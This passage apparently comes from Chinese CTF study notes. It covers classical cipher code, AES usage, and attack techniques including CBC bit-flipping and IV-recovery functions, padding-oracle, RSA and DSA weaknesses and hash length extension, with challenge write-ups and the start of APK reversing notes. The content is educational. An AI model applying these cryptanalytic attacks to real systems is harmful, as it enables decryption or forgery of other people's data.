class="number">1</span>:</span><br><span class="line">            r += origin[(a * origin.index(i) + b) % <span class="built_in">len</span>(origin)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r += i</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure></li></ul><h4 id="8-多表替代密码"><a href="#8-多表替代密码" class="headerlink" title="8. 多表替代密码"></a>8. 多表替代密码</h4><ul><li><p><strong>棋盘类密码（Playfair、Polybius、Nihilist）</strong></p><ul><li><strong>棋盘生成与加密原理</strong>：密钥为 5×5 棋盘，生成时遵循特定规则，不同密码加密方式各异。Playfair 将明文字母两两一组，按规则在棋盘上查找替换字母；Polybius 用棋盘坐标作为密文；Nihilist 原理与 Polybius 相同。</li><li><strong>Python实现（以Playfair为例）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen_cheese_map</span>(<span class="params">k, use_Q=<span class="literal">True</span>, upper=<span class="literal">True</span></span>):</span><br><span class="line">    k = k.upper()</span><br><span class="line">    k0 = <span class="string">&quot;&quot;</span></span><br><span class="line">    origin = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> k0:</span><br><span class="line">            k0 += i</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> origin:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> k0:</span><br><span class="line">            k0 += i</span><br><span class="line">    <span class="keyword">if</span> use_Q == <span class="literal">True</span>:</span><br><span class="line">        k0 = k0[<span class="number">0</span>:k0.index(<span class="string">&quot;J&quot;</span>)] + k0[k0.index(<span class="string">&quot;J&quot;</span>) + <span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k0 = k0[<span class="number">0</span>:k0.index(<span class="string">&quot;Q&quot;</span>)] + k0[k0.index(<span class="string">&quot;Q&quot;</span>) + <span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">if</span> upper == <span class="literal">False</span>:</span><br><span class="line">        k0 = k0.lower()</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(k0) == <span class="number">25</span></span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        r.append(k0[i * <span class="number">5</span>:i * <span class="number">5</span> + <span class="number">5</span>])</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_playfair_2char</span>(<span class="params">tmp, <span class="built_in">map</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">if</span> tmp[i][j] == tmp[<span class="number">0</span>]:</span><br><span class="line">                ai = i</span><br><span class="line">                aj = j</span><br><span class="line">            <span class="keyword">if</span> tmp[i][j] == tmp[<span class="number">1</span>]:</span><br><span class="line">                bi = i</span><br><span class="line">                bj = j</span><br><span class="line">    <span class="keyword">if</span> ai == bi:</span><br><span class="line">        axi = ai</span><br><span class="line">        bxi = bi</span><br><span class="line">        axj = (aj + <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">        bxj = (bj + <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> aj == bj:</span><br><span class="line">        axj = aj</span><br><span class="line">        bxj = bj</span><br><span class="line">        axi = (ai + <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">        bxi = (bi + <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        axi = ai</span><br><span class="line">        axj = bj</span><br><span class="line">        bxi = bi</span><br><span class="line">        bxj = aj</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">map</span>[axi][axj] + <span class="built_in">map</span>[bxi][bxj]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">playfair_encode</span>(<span class="params">m, k=<span class="string">&quot;&quot;</span>, cheese_map=[]</span>):</span><br><span class="line">    m = m.upper()</span><br><span class="line">    origin = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> origin:</span><br><span class="line">            tmp += i</span><br><span class="line">    m = tmp</span><br><span class="line">    <span class="keyword">assert</span> k!= <span class="string">&quot;&quot;</span> <span class="keyword">or</span> cheese_map!= []</span><br><span class="line">    <span class="keyword">if</span> cheese_map == []:</span><br><span class="line">        <span class="built_in">map</span> = gen_cheese_map(k)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">map</span> = cheese_map</span><br><span class="line">    m0 = []</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> idx &lt; <span class="built_in">len</span>(m):</span><br><span class="line">        tmp = m[idx:idx + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> tmp[<span class="number">0</span>]!= tmp[<span class="number">1</span>]:</span><br><span class="line">            m0.append(tmp)</span><br><span class="line">            idx += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> tmp[<span class="number">0</span>]!= <span class="string">&quot;X&quot;</span>:</span><br><span class="line">            m0.append(tmp[<span class="number">0</span>] + <span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m0.append(tmp[<span class="number">0</span>] + <span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> idx == <span class="built_in">len</span>(m) - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> tmp[<span class="number">0</span>]!= <span class="string">&quot;X&quot;</span>:</span><br><span class="line">                m0.append(tmp[<span class="number">0</span>] + <span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">                idx += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m0.append(tmp[<span class="number">0</span>] + <span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line">                idx += <span class="number">1</span></span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m0:</span><br><span class="line">        r.append(_playfair_2char(i, <span class="built_in">map</span>))</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>维吉尼亚密码</strong></p><ul><li><strong>加密特点与破解方法</strong>：多表替代密码，密钥随位置变化，破解常需爆破和词频统计，可利用卡西斯基试验和弗里德曼试验获取密钥长度，也可使用 <code>http://quipqiup.com/index.php</code> 等工具。</li><li><strong>示例代码（部分关键函数）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_encrypt</span>(<span class="params">m, k</span>):</span><br><span class="line">    encrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        char_index = <span class="built_in">ord</span>(m[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        key_index = <span class="built_in">ord</span>(k[i % <span class="built_in">len</span>(k)]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        encrypted += <span class="built_in">chr</span>((char_index + key_index) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt</span>(<span class="params">c, k</span>):</span><br><span class="line">    decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        char_index = <span class="built_in">ord</span>(c[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        key_index = <span class="built_in">ord</span>(k[i % <span class="built_in">len</span>(k)]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        decrypted += <span class="built_in">chr</span>((char_index - key_index + <span class="number">26</span>) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>希尔密码</strong></p><ul><li><strong>加密原理与示例</strong>：运用矩阵论原理，将字母视为二十六进制数字，与密钥矩阵相乘并模 26，密钥矩阵需可逆。例如明文 <code>act</code>，按规则加密后得到密文。</li></ul></li></ul><h2 id="四、现代密码"><a href="#四、现代密码" class="headerlink" title="四、现代密码"></a>四、现代密码</h2><h3 id="（一）分组密码和序列密码"><a href="#（一）分组密码和序列密码" class="headerlink" title="（一）分组密码和序列密码"></a>（一）分组密码和序列密码</h3><h4 id="1-DES-AES基本加解密"><a href="#1-DES-AES基本加解密" class="headerlink" title="1. DES/AES基本加解密"></a>1. DES/AES基本加解密</h4><ul><li><strong>算法参数与特点</strong>：DES 分组长度 64bit，密钥长度 64bit，圈数 16，圈密钥长度 48bit；AES 分组长度 128bit，密钥长度 128bit 时圈数 10，192bit 时圈数 12，256bit 时圈数 14。在 Python 中，使用 PyCrypto 库的 <code>AES</code> 类进行加解密操作，需注意密文输出可能需处理不可见字符，如使用 hex 编码。</li><li><strong>示例代码（AES加密）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">m = <span class="string">&quot;flag&#123;aes_666666&#125;&quot;</span></span><br><span class="line">key = <span class="string">&quot;1234567890abcdef&quot;</span></span><br><span class="line">iv = <span class="string">&quot;fedcba0987654321&quot;</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">c = cipher.encrypt(m)</span><br><span class="line"><span class="built_in">print</span>(c.encode(<span class="string">&quot;hex&quot;</span>))</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-分组密码CBC-bit翻转攻击"><a href="#2-分组密码CBC-bit翻转攻击" class="headerlink" title="2. 分组密码CBC bit翻转攻击"></a>2. 分组密码CBC bit翻转攻击</h4><ul><li><strong>CBC模式原理与攻击思路</strong>：CBC 模式前一组密文与当前分组明文异或后加密。攻击时，可利用异或操作修改密文使特定位置明文改变。通过分析加密过程，找到目标位置密文关系，构造新密文实现攻击。</li><li><strong>示例代码（攻击函数）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cbc_bit_attack_mul</span>(<span class="params">c, m, position, target</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(position)</span><br><span class="line">    r = c</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        change = position[i] - <span class="number">16</span></span><br><span class="line">        tmp = <span class="built_in">chr</span>(<span class="built_in">ord</span>(m[position[i]]) ^ <span class="built_in">ord</span>(target[i]) ^ <span class="built_in">ord</span>(c[change]))</span><br><span class="line">        r = r[<span class="number">0</span>:change] + tmp + r[change + <span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-分组密码CBC选择密文攻击"><a href="#3-分组密码CBC选择密文攻击" class="headerlink" title="3. 分组密码CBC选择密文攻击"></a>3. 分组密码CBC选择密文攻击</h4><ul><li><strong>攻击原理与实现</strong>：利用 CBC 模式加密前明文与 IV 异或及每组 IV 更新特点，构造特定密文可恢复 IV。根据加密公式关系推导计算，在 Python 中实现相关函数进行攻击。</li><li><strong>示例代码（恢复IV函数）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cbc_chosen_cipher_recover_iv</span>(<span class="params">cc, mm</span>):</span><br><span class="line">    <span class="keyword">assert</span> cc[<span class="number">0</span>:<span class="number">16</span>] == cc[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_xorstr</span>(<span class="params">a, b</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            s += <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) ^ <span class="built_in">ord</span>(b[i]))</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    p0 = mm[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    p1 = mm[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="keyword">return</span> _xorstr(_xorstr(p0, p1), cc[<span class="number">0</span>:<span class="number">16</span>])</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-分组密码CBC-padding-oracle攻击"><a href="#4-分组密码CBC-padding-oracle攻击" class="headerlink" title="4. 分组密码CBC padding oracle攻击"></a>4. 分组密码CBC padding oracle攻击</h4><ul><li><strong>攻击条件与流程</strong>：需满足加密采用 PKCS5 填充且能与服务器交互获取 padding 检查结果。从末位开始逐位爆破明文，通过枚举和构造特定密文观察服务器响应，利用 padding 检查机制逆推明文。</li></ul><h4 id="5-Feistel结构分析"><a href="#5-Feistel结构分析" class="headerlink" title="5. Feistel结构分析"></a>5. Feistel结构分析</h4><ul><li><strong>攻击原理与示例</strong>：若 Feistel 结构右边加密线性，可通过分析明密文关系和多轮密钥推出密钥，进而解密。根据题目给定函数和明密文数据，列出关系推导密钥。</li></ul><h4 id="6-攻击伪随机数发生器"><a href="#6-攻击伪随机数发生器" class="headerlink" title="6. 攻击伪随机数发生器"></a>6. 攻击伪随机数发生器</h4><ul><li><strong>常见攻击方式与示例</strong>：<ul><li><strong>时间种子爆破</strong>：若随机数发生器用时间作种子，可爆破时间种子。根据题目中种子生成方式和输入验证逻辑，逆推时间范围进行爆破攻击。</li><li><strong>基于结构的攻击</strong>：如针对 java.util.Random 和 MTrand 等结构，利用其状态变换和输出关系，通过收集输出逆推状态预测随机数。在 Python 中，根据不同结构特点编写攻击代码。</li></ul></li></ul><h3 id="（二）公钥密码"><a href="#（二）公钥密码" class="headerlink" title="（二）公钥密码"></a>（二）公钥密码</h3><h4 id="1-RSA基础"><a href="#1-RSA基础" class="headerlink" title="1. RSA基础"></a>1. RSA基础</h4><ul><li><strong>加密通信过程</strong>：Alice 向 Bob 发送信息时，Bob 生成大素数 <code>p</code>、<code>q</code> 计算 <code>n = p * q</code> 和 <code>e</code>（常取 65537），将 <code>(n, e)</code> 传给 Alice。Alice 将明文转换后计算 <code>c = m^e mod n</code> 传给 Bob，Bob 求 <code>e</code> 关于 <code>n</code> 的欧拉函数逆元 <code>d</code> 解密。可使用 <code>openssl</code> 命令处理相关文件，在 Python 中用 <code>pow</code> 函数实现加密解密计算。</li></ul><h4 id="2-直接模数分解"><a href="#2-直接模数分解" class="headerlink" title="2. 直接模数分解"></a>2. 直接模数分解</h4><ul><li><strong>攻击原理与工具</strong>：当 <code>n</code> 较小时，可通过爆破或工具（如 yafu）分解 <code>n</code> 得到 <code>p</code>、<code>q</code> 进而破解。在题目中获取 <code>n</code>、<code>e</code>、<code>c</code> 后，用 yafu 分解 <code>n</code>，再按 RSA 解密流程计算明文。</li></ul><h4 id="3-费马分解和Pollard-rho分解"><a href="#3-费马分解和Pollard-rho分解" class="headerlink" title="3. 费马分解和Pollard_rho分解"></a>3. 费马分解和Pollard_rho分解</h4><ul><li><strong>原理与应用</strong>：费马分解适用于 <code>p</code>、<code>q</code> 差距小的情况，利用 <code>n = a^2 - b^2</code> 枚举分解；Pollard_rho 分解可处理 <code>p</code>、<code>q</code> 差距大的情况，通过特定迭代计算找因子。yafu 集成了这两种方法，可在解题时尝试。</li></ul><h4 id="4-公约数模数分解"><a href="#4-公约数模数分解" class="headerlink" title="4. 公约数模数分解"></a>4. 公约数模数分解</h4><ul><li><strong>攻击场景与实现</strong>：若 Alice 和 Bob 两次通信 <code>n</code> 有相同大素数因子，可求公约数分解 <code>n</code>。获取两组 <code>n</code>、<code>e</code>、<code>c</code> 后，计算公约数得到共同素因子，进而分解 <code>n</code> 解密。</li></ul><h4 id="5-其他模数分解方式"><a href="#5-其他模数分解方式" class="headerlink" title="5. 其他模数分解方式"></a>5. 其他模数分解方式</h4><ul><li><strong>辅助方法与真题示例</strong>：可使用网站（如 <code>http://factordb.com/index.php</code>）分解模数，有些题目会提供额外信息辅助分解。如 MMA CTF 2016 题目，根据给定 <code>npp</code> 值构造方程求解 <code>p</code>、<code>q</code> 破解。</li></ul><h4 id="6-小指数明文爆破"><a href="#6-小指数明文爆破" class="headerlink" title="6. 小指数明文爆破"></a>6. 小指数明文爆破</h4><ul><li><strong>特殊情况与攻击方法</strong>：当 <code>e</code> 小且明文也小时，可能出现 <code>m^e &lt; n</code> 或 <code>k * n &lt; m^3 &lt; (k + 1) * n</code> 情况，可直接开方或爆破 <code>k</code> 求解明文。在 Python 中通过循环判断和开方计算尝试破解。</li></ul><h4 id="7-选择密文攻击"><a href="#7-选择密文攻击" class="headerlink" title="7. 选择密文攻击"></a>7. 选择密文攻击</h4><ul><li><strong>攻击思路与示例</strong>：若能对任意密文解密（除目标密文），可求目标密文逆元等操作破解。存在交互可获取 1bit 时，可实现 RSA parity oracle 攻击，可通过例题学习具体方法。</li></ul><h4 id="8-LLL-attack"><a href="#8-LLL-attack" class="headerlink" title="8. LLL - attack"></a>8. LLL - attack</h4><ul><li><strong>攻击条件与操作</strong>：若 <code>e = 3</code> 且部分信息泄露（如明文前缀、<code>p</code> 或 <code>q</code> 部分等），可利用 Coppersmith method 求解。在 GitHub 上获取 sage 代码，在 sagemath 在线版修改执行攻击。</li></ul><h4 id="9-Wiener-Attack-amp-Boneh-Durfee-Attack"><a href="#9-Wiener-Attack-amp-Boneh-Durfee-Attack" class="headerlink" title="9. Wiener Attack&amp;Boneh Durfee Attack"></a>9. Wiener Attack&amp;Boneh Durfee Attack</h4><ul><li><strong>攻击原理与应用</strong>：Wiener Attack 针对 <code>e</code> 大但 <code>d</code> 小的情况，可从 GitHub 下载脚本修改攻击；Boneh Durfee attack 适用于 Wiener Attack 不起作用时，具体代码参考 Git 相关内容。</li></ul><h4 id="10-共模攻击"><a href="#10-共模攻击" class="headerlink" title="10. 共模攻击"></a>10. 共模攻击</h4><ul><li><strong>攻击前提与实现</strong>：Bob 两次通信 <code>n</code> 相同且 Alice 加密信息相同，可直接计算明文。根据给定两组 <code>n</code>、<code>e</code>、<code>c</code>，利用扩展欧几里得算法等计算出明文。</li></ul><h4 id="11-广播攻击"><a href="#11-广播攻击" class="headerlink" title="11. 广播攻击"></a>11. 广播攻击</h4><ul><li><strong>攻击条件与示例</strong>：Bob 多次加密指数低且信息相同，可利用中国剩余定理计算。如加密指数为 3 时，通过收集多组 <code>n</code>、<code>c</code>，结合定理计算出明文。</li></ul><h4 id="12-相关消息攻击"><a href="#12-相关消息攻击" class="headerlink" title="12. 相关消息攻击"></a>12. 相关消息攻击</h4><ul><li><strong>攻击原理与代码</strong>：当 Alice 用同一公钥加密有线性关系消息时，可根据给定线性关系和加密公式推导计算出消息。在 Python 中编写函数实现相关计算。</li></ul><h4 id="13-DSA"><a href="#13-DSA" class="headerlink" title="13. DSA"></a>13. DSA</h4><ul><li><strong>攻击要点与示例</strong>：使用相同 <code>k</code> 时可攻击，根据已知条件和公式推导计算出相关参数。如 JarvisOJ 原题，按步骤计算出关键值破解。</li></ul><h3 id="（三）哈希"><a href="#（三）哈希" class="headerlink" title="（三）哈希"></a>（三）哈希</h3><h4 id="1-哈希碰撞"><a href="#1-哈希碰撞" class="headerlink" title="1. 哈希碰撞"></a>1. 哈希碰撞</h4><ul><li><strong>哈希函数性质与 Python实现</strong>：哈希函数需满足应用于任意数据块、生成固定输出、计算简单但不可逆等性质。在 Python 中用 <code>hashlib</code> 库函数计算哈希值，如 <code>sha256</code>、<code>md5</code>、<code>sha1</code> 等，可配合 <code>hexdigest</code> 转换为字符串。</li><li><strong>碰撞攻击与示例</strong>：在 PPC 模式题目中，常需满足特定哈希条件，可爆破求解。根据王小云院士理论，存在哈希碰撞情况，可利用相关工具和知识解题，如 <code>fastcoll</code>。</li></ul><h4 id="2-哈希长度扩展攻击"><a href="#2-哈希长度扩展攻击" class="headerlink" title="2. 哈希长度扩展攻击"></a>2. 哈希长度扩展攻击</h4><ul><li><strong>攻击原理与例题讲解</strong>：在特定计算哈希方式下，可在不知道 <code>secret</code> 时修改 <code>message</code> 得到新哈希值。以 Jarvisoj 题目为例，通过分析题目条件和利用 <code>hashpump</code> 工具计算，尝试不同 <code>salt</code> 长度找到正确结果。</li></ul><h2 id="五、真题解析"><a href="#五、真题解析" class="headerlink" title="五、真题解析"></a>五、真题解析</h2><h3 id="（一）SUPEREXPRESS"><a href="#（一）SUPEREXPRESS" class="headerlink" title="（一）SUPEREXPRESS"></a>（一）SUPEREXPRESS</h3><ul><li><strong>题目分析</strong>：加密算法对 <code>flag</code> 每个字符进行与 <code>key</code> 相关的线性变换，是单表替代密码，可通过已知明密文前几个字符列出方程爆破或计算密钥。</li><li><strong>解题过程</strong>：根据加密程序分析出密钥长度相关信息和字符变换规律，利用 <code>flag</code> 前 6 个字符 <code>TWCTF&#123;</code> 与密文对应关系，爆破或解方程求出加密、解密密钥，最后编写解密脚本得到 <code>flag</code>。</li></ul><h3 id="（二）VIGENERE"><a href="#（二）VIGENERE" class="headerlink" title="（二）VIGENERE"></a>（二）VIGENERE</h3><ul><li><strong>题目分析</strong>：程序先进行 base64 编码再用维吉尼亚加密，增加了破解难度，且词频统计作用受限。</li><li><strong>解题步骤</strong>：通过分析 base64 编码特点和明文取值范围，先利用重复字符间隔计算维吉尼亚密码密钥长度，再根据明文最高 bit 为 0 的条件枚举密钥字符确定部分密钥，最后爆破未知位置得到 <code>flag</code>。</li></ul><h3 id="（三）Revolver"><a href="#（三）Revolver" class="headerlink" title="（三）Revolver"></a>（三）Revolver</h3><ul><li><strong>题目概述</strong>：题目类型为 Reverse + PWN + Crypto，包含初始化验证、多个功能选项，涉及多种密码学操作和攻击面。</li><li><strong>关键操作与攻击方法</strong>：<ul><li><strong>初始化和验证</strong>：proof 过程可爆破 MD5 碰撞通过验证，验证后读取 <code>flag</code> 并用 AES256 加密存储。</li><li><strong>功能分析与攻击</strong>：选项 3 中各功能有不同作用，其中选项 3 - 6（<code>e = 3</code> 的 RSA 加密 AES256 密钥）和选项 3 - 7（存在越界写可构造相关消息攻击）是关键。利用选项 3 - 7 构造条件，结合相关消息攻击恢复 AES256 密钥明文，还可利用 AES 密钥扩展算法恢复初始密钥，以及根据已知明文高 bit 位信息进行攻击。</li><li><strong>检查与修补</strong>：使用私钥检查保证题目完整性，修补时需针对越界写、轮密钥泄露和已知高 bit 位等问题修改程序。</li></ul></li></ul><h3 id="（四）Railgun"><a href="#（四）Railgun" class="headerlink" title="（四）Railgun"></a>（四）Railgun</h3><ul><li><strong>题目特点与攻击方式</strong>：题目类型为 PWN + Crypto，有多种操作和漏洞。攻击方式包括利用 off - by - one 漏洞修改堆结构体控制 AES 密钥，结合整型溢出或快速挖矿，利用 RSA parity oracle 攻击获取 <code>flag</code>；还可通过 Use After Free 漏洞配合其他操作实现相同攻击，同时需注意优化攻击过程减少交互和提升速度。</li></ul><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><ul><li><strong>学习要点与挑战</strong>：Crypto 题目需数学和逻辑基础，初学者有难度，但掌握技巧后是重要得分点。古典密码较简单，分组密码、序列密码和公钥密码是核心考点，哈希函数考点相对较少，同时了解区块链相关知识有助于竞赛。</li><li><strong>未来研究方向</strong>：深入研究分组密码和序列密码的复杂攻击方法、公钥密码的格相关知识、哈希函数新攻击技术以及区块链密码学应用，对提升密码学能力和 CTF 竞赛成绩至关重要。</li></ul><h1 id="APK笔记"><a href="#APK笔记" class="headerlink" title="APK笔记"></a>APK笔记</h1><h2 id="一、APK基础"><a href="#一、APK基础" class="headerlink" title="一、APK基础"></a>一、APK基础</h2><h3 id="（一）Android题目类型"><a href="#（一）Android题目类型" class="headerlink" title="（一）Android题目类型"></a>（一）Android题目类型</h3><p>CTF比赛中的Android题目以APK逆向为主，通常提供APK安装程序或需经流量、解密、拼装等方式获取APK（或dex文件）进行逆向操作。因多数Android系统及题目基于ARM处理器平台，建议使用Android手机调试，模拟器可能有性能和验证问题，研究Android可选用谷歌Nexus系列手机。</p><h3 id="（二）Android基本架构"><a href="#（二）Android基本架构" class="headerlink" title="（二）Android基本架构"></a>（二）Android基本架构</h3><ul><li><strong>整体分层</strong>：分为Linux内核层、系统运行层、应用框架层和应用层，CTF题目主要集中在应用层。从开发角度，Android应用包括Java实现的Dalvik虚拟机层和C/C++实现的Native层，题目逻辑可在这两层。Dalvik层逆向相对简单，Native层较复杂。</li><li><strong>Dalvik虚拟机</strong>：Android应用运行在Dalvik虚拟机（5.0后默认ART虚拟机，但Dalvik知识仍重要），运行Dalvik字节码，由Java字节码转换并打包成DEX文件，有自己的指令集和汇编代码。</li><li><strong>Native层</strong>：用C/C++开发的代码编译成so文件，在应用运行时加载。其与Dalvik层函数关联方式多样，后续会详细阐述。</li></ul><h3 id="（三）ARM架构基础知识"><a href="#（三）ARM架构基础知识" class="headerlink" title="（三）ARM架构基础知识"></a>（三）ARM架构基础知识</h3><p>多数Android应用运行在ARM处理器架构上，以32位ARMv7为例：</p><ul><li><strong>寄存器</strong>：共37个32位寄存器，31个通用寄存器和6个状态寄存器。应用主要运行在用户模式，可访问不分组寄存器R0 - R7、分组寄存器R8 - R14、程序计数器R15（PC）和当前程序状态寄存器CPSR。</li><li><strong>工作状态</strong>：有ARM和Thumb两种状态，可切换。ARM状态执行32位对齐ARM指令，Thumb状态执行16位对齐Thumb指令，由CPSR中的T标志判断。两种状态下部分寄存器命名不同。</li><li><strong>函数调用/跳转指令</strong>：b系列指令用于函数调用和跳转，带“x”的指令可切换模式，带“l”的指令会保存返回地址。函数前4个参数存于R0 - 